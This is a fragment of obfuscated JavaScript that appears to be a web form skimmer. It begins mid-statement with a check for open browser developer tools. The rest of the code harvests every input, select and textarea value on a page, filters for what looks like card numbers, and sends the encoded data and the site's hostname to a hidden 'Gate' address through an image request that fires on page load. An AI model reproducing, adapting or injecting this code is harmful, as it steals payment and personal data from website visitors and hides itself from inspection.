_0x359493=_0x4f2e22?_0xa656('0xa'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x318952&&_0x4f2e22)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0xa656('0xb')]['\x63\x68\x72\x6f\x6d\x65']&&window['\x46\x69\x72\x65\x62\x75\x67'][_0xa656('0xc')][_0xa656('0xd')]||_0x4f2e22||_0x318952)){if(!_0x32af8c[_0xa656('0x3')]||_0x32af8c[_0xa656('0x4')]!==_0x359493){_0xedcbc2(!![],_0x359493);}_0x32af8c[_0xa656('0x3')]=!![];_0x32af8c[_0xa656('0x4')]=_0x359493;}else{if(_0x32af8c[_0xa656('0x3')]){_0xedcbc2(![],undefined);}_0x32af8c['\x69\x73\x4f\x70\x65\x6e']=![];_0x32af8c['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0xa656('0xe')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0xa656('0xf')]=_0x32af8c;}else{window[_0xa656('0x10')]=_0x32af8c;}}());String[_0xa656('0x11')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x301f33=0x0,_0x472c24,_0x97ddd3;if(this[_0xa656('0x12')]===0x0)return _0x301f33;for(_0x472c24=0x0;_0x472c24<this[_0xa656('0x12')];_0x472c24++){_0x97ddd3=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x472c24);_0x301f33=(_0x301f33<<0x5)-_0x301f33+_0x97ddd3;_0x301f33|=0x0;}return _0x301f33;};var _0x1342f0={};_0x1342f0['\x47\x61\x74\x65']=_0xa656('0x13');_0x1342f0['\x44\x61\x74\x61']={};_0x1342f0['\x53\x65\x6e\x74']=[];_0x1342f0[_0xa656('0x14')]=![];_0x1342f0[_0xa656('0x15')]=function(_0x406e35){if(_0x406e35.id!==undefined&&_0x406e35.id!=''&&_0x406e35.id!==null&&_0x406e35.value.length<0x100&&_0x406e35.value.length>0x0){if(_0x452368(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20',''))&&_0x1a8004(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20','')))_0x1342f0.IsValid=!![];_0x1342f0.Data[_0x406e35.id]=_0x406e35.value;return;}if(_0x406e35.name!==undefined&&_0x406e35.name!=''&&_0x406e35.name!==null&&_0x406e35.value.length<0x100&&_0x406e35.value.length>0x0){if(_0x452368(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20',''))&&_0x1a8004(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20','')))_0x1342f0.IsValid=!![];_0x1342f0.Data[_0x406e35.name]=_0x406e35.value;return;}};_0x1342f0[_0xa656('0x16')]=function(){var _0x4353dc=document.getElementsByTagName(_0xa656('0x17'));var _0x85a318=document.getElementsByTagName(_0xa656('0x18'));var _0x30b50e=document.getElementsByTagName(_0xa656('0x19'));for(var _0x5a716d=0x0;_0x5a716d<_0x4353dc.length;_0x5a716d++)_0x1342f0.SaveParam(_0x4353dc[_0x5a716d]);for(var _0x5a716d=0x0;_0x5a716d<_0x85a318.length;_0x5a716d++)_0x1342f0.SaveParam(_0x85a318[_0x5a716d]);for(var _0x5a716d=0x0;_0x5a716d<_0x30b50e.length;_0x5a716d++)_0x1342f0.SaveParam(_0x30b50e[_0x5a716d]);};_0x1342f0[_0xa656('0x1a')]=function(){if(!window.devtools.isOpen&&_0x1342f0.IsValid){_0x1342f0.Data[_0xa656('0x1b')]=location.hostname;var _0xf6d7cd=encodeURIComponent(window.btoa(JSON.stringify(_0x1342f0.Data)));var _0x2c0b78=_0xf6d7cd.hashCode();for(var _0x1b8887=0x0;_0x1b8887<_0x1342f0.Sent.length;_0x1b8887++)if(_0x1342f0.Sent[_0x1b8887]==_0x2c0b78)return;_0x1342f0.LoadImage(_0xf6d7cd);}};_0x1342f0[_0xa656('0x1c')]=function(){_0x1342f0.SaveAllFields();_0x1342f0.SendData();};_0x1342f0[_0xa656('0x1d')]=function(_0x5b1786){_0x1342f0.Sent.push(_0x5b1786.hashCode());var _0x1ea00f=document.createElement(_0xa656('0x1e'));_0x1ea00f.src=_0x1342f0.GetImageUrl(_0x5b1786);};_0x1342f0[_0xa656('0x1f')]=function(_0x33f0ad){return _0x1342f0.Gate+_0xa656('0x20')+_0x33f0ad;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0xa656('0x21')]===_0xa656('0x22')){window[_0xa656('0x23')](_0x1342f0[_0xa656('0x1c')],0x1f4);}};